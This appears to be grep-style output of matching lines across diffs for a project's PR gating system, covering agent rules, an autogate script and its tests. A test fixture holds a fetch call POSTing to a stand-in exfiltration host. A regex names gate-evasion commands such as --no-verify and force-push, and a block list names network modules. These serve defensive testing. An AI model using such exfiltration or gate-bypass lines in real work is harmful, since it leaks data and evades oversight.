@@ -1,0 +1,70 @@
+== d/GB56.diff
+13:+- No crypto, wallets, tokens-as-money, payments; no [REDACTED-PATH] no deletes of others' files; no history rewrites or force-push to main.
+14:+- Do not change `.github/workflows/**`. Do not set or flip any `TESSERA_ENABLE_*` flag.
+32:+3. `autogate.sh <repo> <pr> [--merge]` — Node 22 tests (TESSERA), gitleaks, noreply-author check, no `.github/workflows`, no `TESSERA_
+64:+rg -q '^\.github/workflows/' ../files && fail "touches .github/workflows"
+87:+import json, subprocess, sys, datetime, pathlib, argparse
+93:+sha = subprocess.run(["git", "ls-remote", "https://github.com/vitalitychems-dot/Gitbook", "main"], capture_output=True, text=True).stdou
+95:+    out = subprocess.run(["gh", "pr", "list", "-R", f"vitalitychems-dot/{repo}", "--state", "open", "--json", "number,files"], capture_o
+== d/GB57.diff
+== d/GB59.diff
+536:+        self.assertTrue(imported.isdisjoint({"urllib", "requests", "http", "socket", "ftplib"}))
+== d/GB60.diff
+54:+- **Replit:** The canonical code is TESSERA main. Work on your own branch and open a pull request. Do not push main.
+== d/GB61.diff
+== d/GB62.diff
+272:+import argparse, datetime, json, pathlib, re, subprocess, sys
+400:+        sha = subprocess.run(["git", "ls-remote", f"https://github.com/{OWNER}/Gitbook", "main"], capture_output=True, text=True).stdou
+402:+            out = subprocess.run(["gh", "pr", "list", "-R", f"{OWNER}/{r}", "--state", "open", "--json", "files"], capture_output=True,
+422:+import argparse, fnmatch, json, pathlib, re, subprocess, sys
+429:+GATE_WORDS = re.compile(r"(autogate|gatecheck|protected-paths|CODEOWNERS|--no-verify|git\s+push\s+.*--force|gh\s+pr\s+merge)")
+448:+    return subprocess.run(["git", "-C", d, *a], capture_output=True, text=True, check=True).stdout
+471:+        if subprocess.run(cmd, capture_output=True).returncode != 0: rej.append("gitleaks findings")
+501:+import json, os, pathlib, subprocess, sys
+509:+    o = subprocess.run([str(HERE / "old_gate_local.sh"), r, "main"], capture_output=True, text=True, cwd=r).stdout.strip().startswith("
+530:+import os, pathlib, subprocess, tempfile
+536:+    "workflow edit": ({".github/workflows/ci.yml": "on: push\n"}, NOREPLY),
+537:+    "flag enabled": ({"artifacts/v2/src/brain/rea/cfg.mjs": "export const X = process.env.TESSERA_ENABLE_SELFPATCH = '1';\n"}, NOREPLY)
+554:+    "unlisted host": ({"artifacts/v2/src/brain/rea/up.mjs": "fetch('https://exfil.example.net/u', {method:'POST'})\n"}, NOREPLY),
+563:+    g = lambda *a, e=env: subprocess.run(["git", "-C", r, *a], check=True, capture_output=True, env=e)
+577:+rg -q '^\.github/workflows/' ../files && fail "touches .github/workflows"
+584:+import json, os, pathlib, shutil, subprocess, sys, unittest
+== d/GB63.diff
+== d/T260.diff
+73:+import { execFileSync } from "node:child_process";
+== d/T261.diff
+== d/T262.diff
+40:+    const forged = await fetch(`${started.url}/api/stars`, {
+42:+    const starred = await fetch(`${started.url}/api/stars`, {
+49:+    const forged = await fetch(`${studio.url}gitai/api/stars`, {
+51:+    const starred = await fetch(`${studio.url}gitai/api/stars`, {
+== d/T263.diff
+== d/T264.diff
+135:+import { spawnSync } from "node:child_process";
+== d/T265.diff
+== d/T266.diff
+353:+import { execFileSync } from "node:child_process";
+391:+  const factory = new Function(`${stripTypes(`const EMBEDDING_DIM = 256;\n${chunk}`)}\nreturn localFallbackEmbedding;`);
+== d/T267.diff
+437:+export async function runReasoningEval(options = {}) {
+563:+  const report = await runReasoningEval({ limit: args.limit ?? undefined, model: args.model ?? undefined });
+613:+import { spawnSync } from "node:child_process";
+666:+  const report = await runReasoningEval({
+696:+  const report = await runReasoningEval({
+== d/T268.diff
+53:+import { spawnSync } from "node:child_process";
+== d/T269.diff
+== d/T270.diff
+51:+  const snap = await (await fetch(`/brain/snapshot?t=${t}&prev=${prev}`)).json();
+64:+    const snap = await (await fetch("/brain/snapshot")).json();
+== d/T271.diff
+57:+      "query": "Redact Slack tokens, database URLs, and AWS keys\n\nIDENTITY: Tessera Admin coordinator\n\n## Summar
+418:+      "query": "Tighten local pen gates without touching the hosted pen prompt\n\nStacked on #80. This stays a draf
+189:+      "query": "security: unhook living-person dossiers from served routes\n\n## Stacking\nStacked on PR A (`security/gate-natal-dossie
+339:+      "query": "Fix sidebar conversation delete URL\n\n## Summary\n\nThe sidebar delete caller sent `DELETE /api/conversations?id=...`.
+418:+      "query": "Tighten local pen gates without touching the hosted pen prompt\n\nStacked on #80. This stays a draft until #80 lands, t
+845:+      "query": "Add a make-it-real bridge from voted world objects to real code\n\nA world object that stands for a tool, fix, or doc c
+858:+      "query": "Route the studio and monitor servers through the V2-001 denylist\n\nThe hyb-011 gate was only checked in the file mesh.
+944:+      "query": "Gate server-layer Rick per Gitbook RICK.md (23 audit conflicts)\n\nImplements the fixes from the Sanchez-vs-Gitbook aud
+961:+      "query": "GitAI: opt-in Moltbook identity connector + real-user-only avatars\n\nMoltbook has an official API (moltbook.com/develo
+== d/T272.diff
